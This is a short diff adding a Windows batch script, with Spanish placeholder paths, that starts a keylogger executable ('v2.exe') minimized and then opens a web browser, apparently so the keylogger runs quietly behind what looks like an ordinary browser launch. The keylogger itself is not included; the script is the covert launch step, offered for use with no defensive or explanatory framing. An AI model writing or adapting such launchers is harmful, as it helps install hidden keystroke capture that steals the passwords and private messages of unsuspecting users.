@@ -1,0 +1,5 @@
+@echo off
+cd <ruta del keyloger >
+start /MIN v2.exe
+cd <ruta del navegador >
+start <nombre del nabegador .exe>
